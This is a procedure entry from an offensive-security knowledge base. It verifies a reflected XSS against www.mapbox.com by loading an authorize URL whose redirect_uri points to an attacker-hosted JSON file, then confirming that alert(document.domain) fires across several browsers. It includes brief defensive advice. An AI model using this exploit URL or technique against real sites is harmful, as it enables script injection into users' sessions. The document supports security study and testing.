---
id: proc-verify-js-execution
tags:
  - xss-verification
  - javascript
type: procedure
tools:
  - '[[tools/Chrome]]'
  - '[[tools/Safari]]'
  - '[[tools/Firefox]]'
  - '[[tools/Internet-Explorer-11]]'
  - '[[tools/Edge]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T00:11:09.174Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Verify-JavaScript-Execution-in-Browser

## Summary

This procedure confirms the success of the XSS by loading the malicious authorize URL in various browsers and observing the execution of the injected JavaScript payload, such as an alert proving domain access.

## Description

After triggering the redirect and injection, the script tag executes in the browser context of www.mapbox.com, allowing arbitrary JS. The PoC uses alert(document.domain) to demonstrate control, popping 'www.mapbox.com'. This works across modern and legacy browsers due to the reflected nature and lack of CSP blocking the injection.

## Requirements

1. Successful completion of prior steps (JSON hosted, CORS set, URL triggered).
2. Multiple browsers for cross-browser testing.
3. No additional setup beyond standard browser installation.

## Defense

Defensive measures and detection strategies:

- Deploy CSP with script-src 'self' to prevent inline JS execution.
- Use browser security features like XSS Auditor (deprecated but similar in modern browsers).
- Monitor for alert() or other PoC indicators in client-side logs.
- Implement client-side validation to strip script tags from dynamic content.

## Objectives

1. Validate payload execution and domain context.
2. Test compatibility across browser engines.
3. Confirm high-impact code execution.

## Instructions

### Step 1: Load in Target Browser

**Context**: Navigate to the malicious URL and watch for the alert popup.

In [[tools/Chrome]], visit https://www.mapbox.com/authorize/?redirect_uri=https://u00f1.xyz/mapbox/oauth.json

> Expect an alert dialog with 'www.mapbox.com' immediately upon page load.

### Step 2: Repeat in Other Browsers

**Context**: Verify consistency across Chrome, Safari, Firefox, IE11, and Edge to ensure broad exploitability.

Load the same URL in [[tools/Safari]], [[tools/Firefox]], [[tools/Internet-Explorer-11]], and [[tools/Edge]].

> In each, the alert should fire without errors, confirming execution in diverse rendering engines.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Chrome]]
- [[tools/Safari]]
- [[tools/Firefox]]
- [[tools/Internet-Explorer-11]]
- [[tools/Edge]]

## Tags

- verification
- browser
- execution
